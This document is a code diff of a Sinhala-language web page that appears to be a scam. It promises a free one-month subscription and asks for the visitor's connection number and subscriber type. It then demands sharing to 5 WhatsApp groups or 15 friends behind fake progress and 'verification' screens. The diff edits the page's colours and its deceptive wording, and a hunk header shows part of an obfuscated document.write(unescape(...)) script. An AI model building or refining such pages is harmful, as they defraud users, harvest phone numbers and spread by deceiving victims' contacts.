@@ -153,7 +153,7 @@ a {
 }
 .amount,
 #getname {
-    color: #0e893d;
+    color: #30c157;
     text-decoration: none;
 }
 .done {
@@ -170,7 +170,7 @@ a {
     display: none;
     text-align: center;
     font-size: 14px;
-    color: #e74c3c;
+    color: red;
 }
 button {
     display: block;
@@ -184,7 +184,7 @@ button {
     border-radius: 5px;
     padding: 0 10px;
     margin: 10px auto;
-    background: #02561e;
+    background: #30c157;
     transition: background 0.3s ease;
 }
 button:hover {
@@ -277,7 +277,7 @@ button:hover {
     display: none;
 }
 .counter {
-    color: #7f7f7f;
+    color: #ffff;
     font-size: 12px;
     text-align: right;
     padding: 10px 0 10px 2px;
@@ -359,7 +359,7 @@ button:hover {
     font-size: 12px;
     font-weight: bold;
     margin: 10px 0 0 47px;
-    color: #90949c;
+    color: #30c157;
 }
 .action {
     cursor: pointer;
@@ -384,74 +384,14 @@ button:hover {
 ;
 }
 .nwhd{
-    background-color: #00e851
+    background-color: #30c157
 ;
     color: white;
     font-size: 20px;
 }
 </style>
 
-  <style>
   
-  .marquee {
-  background-image: linear-gradient(555deg, #ff0080, green, #ff00ff, #111, #008080);
-  border: 3px solid #ff0080;
-  width: 100%;
-  padding: 3px;
-  border-radius: 40px;
-  color: #000;
-  font-weight: bold;
-  font-size: 18px;
-  overflow: hidden;
-  white-space: nowrap;
-  padding-left: 10px;
-}
-
-.marquee span {
-  display: inline-block;
-  padding-left: 100%;
-  animation: marquee-animation 20s linear infinite;
-}
-
-@keyframes marquee-animation {
-  0% {
-    transform: translateX(0);
-  }
-  50% {
-    transform: translateX(-100%);
-  }
-  100% {
-    transform: translateX(0);
-  }
-}
-.animated-text {
-    font-size: 2rem;
-    color: white;
-    opacity: 0;
-    transform: translateY(20px);
-    animation: fadeInUp 2s ease-out forwards, blink 1s step-start infinite;
-}
-
-@keyframes fadeInUp {
-    0% {
-        opacity: 0;
-        transform: translateY(20px);
-    }
-    100% {
-        opacity: 1;
-        transform: translateY(0);
-    }
-}
-
-@keyframes blink {
-    0%, 50%, 100% {
-        opacity: 1;
-    }
-    25%, 75% {
-        opacity: 0;
-    }
-}
-</style>
   <style>
         /* Reset some default styles */
         body, h1, h2, h3, p, ul, li {
@@ -560,6 +500,67 @@ button:hover {
             padding: 20px 0;
         }
     </style>
+	<style>
+  
+  .marquee {
+  background-image: linear-gradient(555deg, #ff0080, green, #ff00ff, #111, #008080);
+  border: 3px solid #ff0080;
+  width: 100%;
+  padding: 3px;
+  border-radius: 40px;
+  color: #000;
+  font-weight: bold;
+  font-size: 18px;
+  overflow: hidden;
+  white-space: nowrap;
+  padding-left: 10px;
+}
+
+.marquee span {
+  display: inline-block;
+  padding-left: 100%;
+  animation: marquee-animation 20s linear infinite;
+}
+
+@keyframes marquee-animation {
+  0% {
+    transform: translateX(0);
+  }
+  50% {
+    transform: translateX(-100%);
+  }
+  100% {
+    transform: translateX(0);
+  }
+}
+.animated-text {
+    font-size: 2rem;
+    color: white;
+    opacity: 0;
+    transform: translateY(20px);
+    animation: fadeInUp 2s ease-out forwards, blink 1s step-start infinite;
+}
+
+@keyframes fadeInUp {
+    0% {
+        opacity: 0;
+        transform: translateY(20px);
+    }
+    100% {
+        opacity: 1;
+        transform: translateY(0);
+    }
+}
+
+@keyframes blink {
+    0%, 50%, 100% {
+        opacity: 1;
+    }
+    25%, 75% {
+        opacity: 0;
+    }
+}
+</style>
   
 
 
@@ -593,23 +594,23 @@ button:hover {
             <button id="go">Activate➤</button>
         </div>
         <div id="loader">
-            <div>කරුණාකර රැඳී සිටින්න...</div>
+            <div><font color="white">කරුණාකර රැඳී සිටින්න...</div>
             <div class="spin"></div>
             <div id="num">0%</div>
         </div>
         <div id="info">
-            <p class="title">Enter connection number</p>
+            <p class="title"></p>
             <div class="phone">
                 <center><input type="char" placeholder="Enter connection number" id="name" name="Phone" style="fontwidth: 244px;height: 56px;font-size: 18px;width: 330px;" onkeypress="return numberonly(event);"></center>
           
     
-          <center><p class="title"><font color="red">ඔයා අලුත්ද පරණද?</font></p></center>
+          <center><p class="title"><font color="white">ඔයා අලුත්ද පරණද?</font></p></center>
           <center>
 <select aria-label="الجنس" name="birthday_year" id="year" title="الجنس" class="_5dba" style="
     width: 330px;
     height: 56px;
 ">
-<option value="أختر نوع الشبكة" selected="1">---SELECT---</option>
+<option value="أختر نوع الشبكة" selected="1">---තෝරන්න---</option>
   <option value="1">අලුත්</option>
 <option value="2"> පැරණි</option>
   
@@ -623,7 +624,7 @@ button:hover {
             <p class="error">කරුණාකර අංකය ඇතුළත් කරන්න.</font></b></a></p>
         </div>
         <div id="checking">
-            <p class="title">කරුණාකර මොහොතක් ඉන්න...</p>
+            <p class="title"><font color="white">කරුණාකර මොහොතක් ඉන්න...</p>
             <div class="barr">
                 <div class="fill">
                     <div id="fill"></div>
@@ -639,11 +640,11 @@ button:hover {
 
             <p class="tip"> සුභ පැතුම්, <span id="getname"></span>.</p>
             <p class="tip">
-               ඔබ මෙම දීමනාව සඳහා සුදුසුකම් ලබයි.<br><br> <span class="amount"> නොමිලේ මාස 1ක දායකත්වය සක්‍රිය කරන්නේ කෙසේද?</span><br>
-              මෙය අනෙකුත් ග්‍රාහකයින් සමඟ බෙදා ගන්න.:
+               <font color="white">ඔබ මෙම දීමනාව සඳහා සුදුසුකම් ලබයි.<br><br> <span class="amount"> <font color="white">නොමිලේ මාස 1ක දායකත්වය සක්‍රිය කරන්නේ කෙසේද?</span><br>
+             <font color="white"> මෙය අනෙකුත් ග්‍රාහකයින් සමඟ බෙදා ගන්න.:
             </p><br>
-            <p class="tip">WhatsApp හි කණ්ඩායම් 5 ක් හෝ මිතුරන් 15 ක් සමඟ බෙදා ගන්න (පහත "බෙදාගන්න" නිරූපකය මත ක්ලික් කරන්න).</p>
-            <p class="tip">හරිත සත්‍යාපන තීරුව පිරවූ පසු ඔබව ස්වයංක්‍රීයව අපගේ "සක්‍රිය කිරීම" පිටුවට හරවා යවනු ලැබේ.</p>
+            <p class="tip"><font color="white">WhatsApp හි කණ්ඩායම් 5 ක් හෝ මිතුරන් 15 ක් සමඟ බෙදා ගන්න (පහත "බෙදාගන්න" නිරූපකය මත ක්ලික් කරන්න).</p>
+            <p class="tip"><font color="white">හරිත සත්‍යාපන තීරුව පිරවූ පසු ඔබව ස්වයංක්‍රීයව අපගේ "සක්‍රිය කිරීම" පිටුවට හරවා යවනු ලැබේ.</p>
            
 
             <button id="whatsapp">බෙදාගන්න➤</button>
@@ -659,7 +660,7 @@ button:hover {
         </div>
          <div id="claim">
             <p class="done"><i class="fa fa-check-circle fa-3x" aria-hidden="true"></i></p>
-            <p class="title">ඔබේ මාසයක නොමිලේ දායකත්වය ලබා ගැනීමට "සක්‍රිය කරන්න" ක්ලික් කරන්න<span class="amount"></span> </p>
+            <p class="title"><font color="white">ඔබේ මාසයක නොමිලේ දායකත්වය ලබා ගැනීමට "සක්‍රිය කරන්න" ක්ලික් කරන්න<span class="amount"></span> </p>
            
            
            <br/>
@@ -845,7 +846,7 @@ document.write(unescape('%20%3Cscript%20type%3D%22text/javascript%22%3E%0A%20var
 </script>
           
 <!-- BEGIN: Powered by Supercounters.com -->
-<center><script type="text/javascript" src="//widget.supercounters.com/ssl/online_t.js"></script><script type="text/javascript">sc_online_t(1715285,"","0000");</script><br><noscript><a href="https://www.supercounters.com/">supercounters.com</a></noscript>
+<center><script type="text/javascript" src="//widget.supercounters.com/ssl/online_t.js"></script><script type="text/javascript">sc_online_t(1715285,"","30c157");</script><br><noscript><a href="https://www.supercounters.com/">supercounters.com</a></noscript>
 </center>
 <!-- END: Powered by Supercounters.com -->
 
